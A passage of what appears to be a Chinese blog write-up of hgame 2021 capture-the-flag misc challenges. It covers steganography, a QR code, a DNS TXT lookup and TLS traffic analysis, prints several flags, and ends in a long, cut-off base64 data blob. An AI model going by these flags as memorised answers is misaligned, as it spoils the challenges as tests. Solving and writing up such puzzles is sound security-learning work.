+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;4G00DS0NGBUTN0T4G00DMAN039310KI&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><p>Stegsolve 可解出图中有一个二维码。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292823942.8a5738b9adbc70c9dc141fbd4e986bf6ea243afb.png@200w.png"></p>
+<p>扫描之后可得如下信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC&#x2F;KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51&#x2F;KHHT&#x2F;6&#x2F;ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5&#x2F;IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF&#x2F;LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y&#x2F;&#x2F;&#x2F;p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>很容易看出这是一张图片，使用 Cyberchef 经过 <code>From Base64 --&gt; Reverse --&gt; Render Image --&gt; Rotate Image --&gt; Flip Image</code> 之后可以得到如下图片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292993797.3de98ca72000ada1b944261d195a8eb09df8ff1e.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonprefect.cn&#x2F;cb&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,true)Reverse(&#39;Character&#39;)Render_Image(&#39;Raw&#39;)Rotate_Image(180)Flip_Image(&#39;Horizontal&#39;)&amp;input&#x3D;Z21CQ3JrUk9SVWtBQUFBQStqcmdzV2FqYXEwQmVDM0lRaENFSVFoQ0tadzFNeFR6U2xOS25tSnBpdlc5SUhWUHJUanZra3VJM3NQN2JXQUVkSUhXQ2JEc0dzUmtaOUlVSkM5QWhmWkZicHFybVpCdEkrWnZwdFdDL0tDUHJMMGdGZVJQT2NJMld5cWpuZGZVV2xOaitkZ1dwZTFxU1RFY2R1clh6TVJBYzVFaWhzRWZsbUlOOFJ6dWd1V3E2MUpXUlFwU0k1MS9LSEhULzYvenRQWkozM1NTS2JpZVRhMUM1a29PTmJMY2Y5YVltc1ZoN1JXNnAzU3BBU25VU2IzSnVTdnBVQkt4c2NieUJqaU9wT1RxOGpjZFJzeDUvSW5kWHczVmdKVjZpTzErNmpsNGdqVnBXb3VWaU82aWg5Wm15YlNQa2hhcXlOVXhWWHBWNWNZVStYeDVzUVRmS3lzdERMaXBtcWFNaHhJY2d2cGxMcUYvTFdaeklTNVB2d2JxT3ZyU2xOSFZFWWNoQ0VJUUlTSUNTWkppand1NTByUlFIRHlVcGFGMHkvLy9wNkZFRENDREZzdVc3WUZvVkVGRVNUMEJBQUNMZ0xPckFBQUFBZ2dVQUFBQXRBQUFBRkpFU0VrTkFBQUFDaG9LRFVkT1VJaz0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;tenchi_souzou_dezain_bu&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>flag 转写成日文是“天地創造デザイン部”，谷歌翻译成中文是“天堂设计部”。</p>
+</blockquote>
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>使用 Wireshark 分析流量包，筛选 HTTP 条目可看到如下信息。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293155011.989e138acd4b2fdd8db0dd70ebc3aa55d3f69f8e.png"></p>
+<p>根据信息可知 SPF 是 txt 记录，同时在请求中可以看到请求域名是 flag.hgame2021.cf。使用 nslookup 查询这个域名的 txt 记录可得 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293546586.acdc82654c77ee6425baa219b4222a44d05865e6.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;D0main_N4me_5ystem&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="A-R-K"><a href="#A-R-K" class="headerlink" title="A R K"></a>A R K</h3><p>Wireshark 分析流量包，跟踪 FTP 流量可得到如下 log。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399386464.dcb47fe07ceed6f6d6ea23971438f9865d6f5826.png"></p>
+<p>将 log 导入 Wireshark 后跟踪 TLS 流。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399410855.92e454ce47a9efd61de1f8e25156c0c769916628.png"></p>
+<p>根据提示着重观察 HTTP 请求 <code>/quest/getBattleReplay</code>，将其响应数据导出并解 GZIP 可得如下数据。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;battleReplay&quot;</span>:<span class="string">&quot;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